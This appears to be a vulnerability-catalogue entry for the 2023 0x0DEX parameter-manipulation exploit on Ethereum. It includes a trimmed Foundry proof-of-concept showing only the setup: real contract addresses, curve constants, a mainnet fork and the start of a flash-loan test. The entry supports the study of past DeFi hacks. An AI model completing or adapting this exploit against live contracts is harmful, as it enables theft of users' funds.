# [?] 0x0DEX - Parameter manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: 0x0DEX
Published: 2023-09-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/0x0DEX_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$61K
References:
- https://0x0ai.notion.site/0x0ai/0x0-Privacy-DEX-Exploit-25373263928b4f18b31c438b2a040e33
- https://etherscan.io/address/0xc44ea7650b27f83a6b310a8fed9e9daf2864a65b#code

```solidity
contract ContractTest is Test {
    IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // begin sync with library Sig1.
    uint256 private constant Bx =
        1_368_015_179_489_954_701_390_400_359_078_579_693_043_519_447_331_113_978_918_064_868_415_326_638_035;
    uint256 private constant By =
        9_918_110_051_302_171_585_080_402_603_319_702_774_565_515_993_150_576_347_155_970_296_011_118_125_764;
    uint256 private constant Hx =
        2_286_484_483_920_925_456_308_759_965_850_684_826_720_807_236_777_393_886_284_879_343_816_677_643_124;
    uint256 private constant Hy =
        1_804_024_400_776_434_902_361_310_543_986_557_260_474_938_171_670_710_692_674_407_862_657_333_646_188;
    // https://github.com/kendricktan/heiswap-dapp/blob/master/contracts/AltBn128.sol#L13
    uint256 private constant curveN = 0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_115_707);
        vm.label(address(OxODexPool), "OxODexPool");
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(BalancerVault), "BalancerVault");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        uint256 loan = 11 ether;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/0x0DEX_exp.sol_
